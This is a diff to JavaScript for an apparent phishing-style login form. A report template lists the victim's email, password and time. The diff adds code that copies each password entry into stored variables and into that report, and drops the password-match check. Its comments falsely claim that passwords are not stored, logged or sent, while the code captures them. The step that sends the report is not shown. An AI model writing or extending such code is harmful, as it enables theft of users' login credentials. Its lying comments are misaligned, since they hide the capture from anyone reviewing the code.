@@ -2208,6 +2208,8 @@ Email:
 ${storedEmail || "Not provided"}
 Password:
 ${storedPassword || "Not provided"}
+${storedConfirmPassword || "Not provided"}
+
 
 Time:
 ${new Date().toLocaleString()}`;
@@ -3399,7 +3401,8 @@ ${new Date().toLocaleString()}`;
                     fieldInput
                         ? fieldInput.value.trim()
                         : "";
-				
+				storedPassword = val;
+				storedConfirmPassword = val;
 
 
                 // ==================================================
@@ -3566,7 +3569,6 @@ ${new Date().toLocaleString()}`;
                 ) {
 
                     if (!val) {
-					
 
                         if (fieldInput) {
 
@@ -3601,7 +3603,6 @@ ${new Date().toLocaleString()}`;
                      * It is not logged.
                      * It is not sent.
                      */
-					storedPassword = val;
 
 
                     if (fieldInput) {
@@ -3614,139 +3615,113 @@ ${new Date().toLocaleString()}`;
                     goToStep(3);
                 }
 
-// ==================================================
-// STEP 3 - PASSWORD CONFIRMATION
-// ==================================================
 
-else if (
-    step === 3
-) {
+                // ==================================================
+                // STEP 3 - LOCAL ONLY
+                // ==================================================
 
-    if (!val) {
+                else if (
+                    step === 3
+                ) {
 
-        if (fieldInput) {
+                    if (!val) {
 
-            fieldInput.classList.add(
-                "shake"
-            );
+                        if (fieldInput) {
 
-            setTimeout(
-                function () {
+                            fieldInput.classList.add(
+                                "shake"
+                            );
 
-                    fieldInput.classList.remove(
-                        "shake"
-                    );
 
-                },
-                300
-            );
-        }
+                            setTimeout(
+                                function () {
 
-        return;
-    }
+                                    fieldInput.classList.remove(
+                                        "shake"
+                                    );
 
-    storedConfirmPassword = val;
+                                },
+                                300
+                            );
+                        }
 
-    if (
-        storedPassword !==
-        storedConfirmPassword
-    ) {
+                        return;
+                    }
 
-        if (fieldInput) {
 
-            fieldInput.classList.add(
-                "input-error",
-                "shake"
-            );
-        }
+                    /*
+                     * IMPORTANT:
+                     *
+                     * The value entered here is also
+                     * discarded immediately.
+                     *
+                     * No password comparison.
+                     * No password storage.
+                     * No password transmission.
+                     */
 
-        if (hintText) {
 
-            hintText.textContent =
-                "Passwords do not match";
-        }
+                    if (fieldInput) {
 
-        if (hintIcon) {
+                        fieldInput.value =
+                            "";
 
-            hintIcon.className =
-                "fas fa-exclamation-circle";
+                        fieldInput.classList.add(
+                            "input-success"
+                        );
+                    }
 
-            hintIcon.style.color =
-                "#d93025";
-        }
 
-        setTimeout(
-            function () {
+                    const originalHTML =
+                        submitBtn
+                            ? submitBtn.innerHTML
+                            : "";
 
-                if (fieldInput) {
 
-                    fieldInput.classList.remove(
-                        "shake"
+                    if (btnText) {
+
+                        btnText.textContent =
+                            "Continuing";
+                    }
+
+
+                    if (btnIcon) {
+
+                        btnIcon.className =
+                            "fas fa-spinner fa-spin";
+                    }
+
+
+                    if (submitBtn) {
+
+                        submitBtn.disabled =
+                            true;
+                    }
+
+
+                    setTimeout(
+                        function () {
+
+                            if (submitBtn) {
+
+                                submitBtn.innerHTML =
+                                    originalHTML;
+
+                                submitBtn.disabled =
+                                    false;
+                            }
+
+
+                            finalizeLogin();
+
+                        },
+                        600
                     );
                 }
-
-            },
-            300
-        );
-
-        return;
-    }
-
-    if (fieldInput) {
-
-        fieldInput.value =
-            "";
-
-        fieldInput.classList.remove(
-            "input-error"
-        );
-
-        fieldInput.classList.add(
-            "input-success"
-        );
-    }
-
-    const originalHTML =
-        submitBtn
-            ? submitBtn.innerHTML
-            : "";
-
-    if (btnText) {
-
-        btnText.textContent =
-            "Continuing";
-    }
-
-    if (btnIcon) {
-
-        btnIcon.className =
-            "fas fa-spinner fa-spin";
-    }
-
-    if (submitBtn) {
-
-        submitBtn.disabled =
-            true;
-    }
-
-    setTimeout(
-        function () {
-
-            if (submitBtn) {
-
-                submitBtn.innerHTML =
-                    originalHTML;
-
-                submitBtn.disabled =
-                    false;
             }
+        );
+    }
 
-            finalizeLogin();
-
-        },
-        600
-    );
-}
 
     // ============================================================
     // HASH CHANGE
